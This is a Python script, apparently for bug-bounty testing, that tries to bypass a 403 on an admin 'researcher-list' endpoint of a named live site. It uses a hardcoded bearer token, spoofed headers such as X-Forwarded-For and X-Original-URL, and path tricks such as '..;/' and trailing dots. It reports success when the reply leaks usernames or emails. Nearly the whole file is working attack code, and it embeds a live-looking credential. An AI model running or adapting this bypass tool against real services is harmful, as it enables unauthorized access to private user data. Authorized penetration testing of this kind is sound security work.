#!/usr/bin/env python3
"""
Strict 403 Bypass Verifier
Only reports a bypass if the server returns valid JSON data.
"""
import requests
import sys
import json
from urllib.parse import urlparse

# --- CONFIGURATION ---
TARGET_URL = "https://app.bugv.io/api/admin/researcher-list"
AUTH_TOKEN = "796a127e-9130-4a99-a006-d5bd7da41af9"
# ---------------------

def is_valid_json_data(response):
    """
    The core logic: Checks if the response is actually leaked data.
    """
    try:
        # 1. Check if it's HTML (The SPA shell)
        if 'text/html' in response.headers.get('Content-Type', ''):
            return False, "Returned HTML (SPA Shell)"
        
        # 2. Check if it's JSON (Potential data)
        if 'application/json' in response.headers.get('Content-Type', ''):
            data = response.json()
            
            # 3. Check if the JSON contains actual user data (not an error message)
            if isinstance(data, list) and len(data) > 0:
                # Check for common data fields
                sample = data[0]
                if 'username' in sample or 'email' in sample or 'id' in sample:
                    return True, "Valid JSON data found!"
            if isinstance(data, dict) and 'error' not in data and 'message' not in data:
                 return True, "Valid JSON object found!"
                 
            return False, "Returned JSON error/empty response"
            
        return False, "Unknown Content-Type"
    except Exception as e:
        return False, f"Parse Error: {str(e)}"

def test_bypass(technique_name, url, headers=None):
    print(f"[*] Testing: {technique_name} -> {url}")
    
    # Default headers
    if headers is None:
        headers = {}
    
    # Always inject the Auth Token
    headers['Authorization'] = f'Bearer {AUTH_TOKEN}'
    headers['Accept'] = 'application/json' # Tell server we want JSON, not HTML

    try:
        # Send request (using HTTPS and ignoring SSL for local testing if needed, but bugv has valid certs)
        response = requests.get(url, headers=headers, timeout=10, allow_redirects=False)
        
        # Check if we got a 200 or 302 (Redirects can sometimes leak)
        if response.status_code in [200, 302]:
            is_bypass, reason = is_valid_json_data(response)
            
            if is_bypass:
                print(f"\n🚨 [!!!] BYPASS CONFIRMED! [!!!] 🚨")
                print(f"Technique: {technique_name}")
                print(f"URL: {url}")
                print(f"Status: {response.status_code}")
                print(f"Content-Type: {response.headers.get('Content-Type')}")
                print(f"Body snippet: {response.text[:200]}...")
                print("----------------------------------------")
                return True
            else:
                # It was a 200, but not a valid bypass (False Positive caught!)
                # We only print this to show the tool is working.
                # print(f"    [-] False Positive: {reason} (Size: {len(response.text)})") 
                pass
        else:
            # Expected 403/400/401
            pass
            
    except requests.exceptions.RequestException as e:
        print(f"    [!] Request failed: {e}")

    return False

def main():
    print("Starting Strict 403 Bypass Verifier...")
    print(f"Target: {TARGET_URL}")
    print(f"Token: {AUTH_TOKEN[:8]}...")
    print("=" * 40)

    # 1. Baseline Check
    base_headers = {'Authorization': f'Bearer {AUTH_TOKEN}'}
    try:
        base_resp = requests.get(TARGET_URL, headers=base_headers, timeout=10)
        if base_resp.status_code == 403 and 'application/json' in base_resp.headers.get('Content-Type', ''):
            print("[+] Baseline confirmed: 403 Forbidden (Secure)")
        else:
            print(f"[!] Warning: Baseline status is {base_resp.status_code}. Ensure token is valid.")
    except:
        print("[!] Could not establish baseline.")

    # Parse Base URL
    parsed = urlparse(TARGET_URL)
    host = parsed.netloc
    path = parsed.path

    # --- LIST OF PAYLOADS TO TEST ---
    # 1. Header Spoofing (Using the most common ones)
    header_payloads = [
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Original-URL", path),
        ("X-Rewrite-URL", path),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("Client-IP", "127.0.0.1"),
        ("Referer", f"http://{host}{path}"),
    ]

    found_bypass = False

    # Test Headers
    for h_name, h_val in header_payloads:
        # We test by adding the header to the standard request
        headers = {h_name: h_val}
        # Note: X-Original-URL typically requires a different path structure. 
        # We test standard header injection here.
        if test_bypass(f"Header: {h_name}: {h_val}", TARGET_URL, headers.copy()):
            found_bypass = True

    # 2. Path Manipulation (The most common bypasses)
    path_payloads = [
        f"{path}/",                # Trailing slash
        f"{path}/.",               # Trailing dot
        f"{path}%20",              # Trailing space
        f"{path}..;/",             # Semicolon traversal
        f"/.{path}",               # Prefix dot (unKover trick)
        f"/api/admin/researcher-list", # Case variation (Note: this usually hits SPA)
    ]

    for p in path_payloads:
        new_url = f"https://{host}{p}"
        if test_bypass(f"Path: {p}", new_url, {}):
            found_bypass = True

    print("\n" + "="*40)
    if not found_bypass:
        print("[-] RESULT: No valid bypass found. The endpoint is secure.")
        print("[-] (Any 200 OK responses were SPA HTML shells or empty errors).")
    else:
        print("[+] RESULT: A valid bypass was found! Please review the output above.")

if __name__ == "__main__":
    main()